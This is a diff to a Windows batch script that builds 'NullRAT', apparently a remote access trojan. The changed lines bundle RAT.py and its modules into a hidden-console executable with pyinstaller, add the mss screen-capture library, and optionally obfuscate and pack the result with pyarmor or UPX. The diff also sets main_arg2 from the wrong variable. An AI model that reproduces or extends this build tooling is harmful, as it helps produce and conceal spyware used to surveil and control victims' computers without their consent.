@@ -205,6 +205,23 @@ if "!icon!"=="yes" (
 )
 if "!upxdd!"=="yes" (set "path=!path!;%~dp0\NullRAT\upx;%~dp0\upx")
 
+cd "%~dp0"
+set "folder=compiling-%random%"
+mkdir "!folder!" & cd "NullRAT"
+copy *.* ..\"!folder!"
+copy "modules\*.*" ..\"!folder!"
+
+cd modules
+
+set "main_arg=pyinstaller --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"
+set "main_arg2=pyinstaller --onefile --noconsole --hidden-import mss"
+for %%i in (*) do set "main_arg=!main_arg! --add-data %%~nxi;."
+for %%i in (*) do set "main_arg2=!main_arg2! --add-data %%~nxi;."
+set "main_arg=!main_arg! RAT.py"
+set "main_arg2=!main_arg! RAT.py"
+
+cd "%~dp0!folder!"
+
 if "!pyarmor!"=="yes" (
 	if "!icon!"=="yes" (
 		pyarmor pack -e " --onefile --noconsole --icon=custom_icon.ico " RAT.py
@@ -213,15 +230,15 @@ if "!pyarmor!"=="yes" (
 	)
 ) else (
 	if "!icon!"=="yes" (
-		pyinstaller --onefile --noconsole --icon=custom_icon.ico RAT.py
+		!main_arg!
 	) else (
-		pyinstaller --onefile --noconsole RAT.py
+		!main_arg2!
 	)
 )
 
 move dist\RAT.exe "%~dp0\" & echo.
-rmdir /s /q "build"
-rmdir /s /q "dist"
+cd "%~dp0\"
+rmdir /s /q "!folder!"
 timeout /t 2
 
 exit
@@ -231,11 +248,9 @@ cd "%~dp0"
 if exist "NullRAT\" (
 	move NullRAT\custom_icon.ico "%~dp0"
 	move NullRAT\RAT.py "%~dp0"
+	move NullRAT\modules "%~dp0"
 	move NullRAT\upx\upx.exe "%~dp0"
 	rmdir /s /q NullRAT
-	
-	mkdir upx
-	move upx.exe upx\ 
 )
 attrib -h ".git"
 del README.md
@@ -245,5 +260,12 @@ if exist RAT.exe (del RAT.exe)
 rmdir /s /q ".git"
 rmdir /s /q "build"
 rmdir /s /q "dist"
+
+mkdir NullRAT
+move custom_icon.ico "%~dp0\NullRAT"
+move RAT.py "%~dp0\NullRAT"
+move modules "%~dp0\NullRAT"
+mkdir NullRAT\upx
+move upx.exe "%~dp0\NullRAT\upx"
 
 goto main
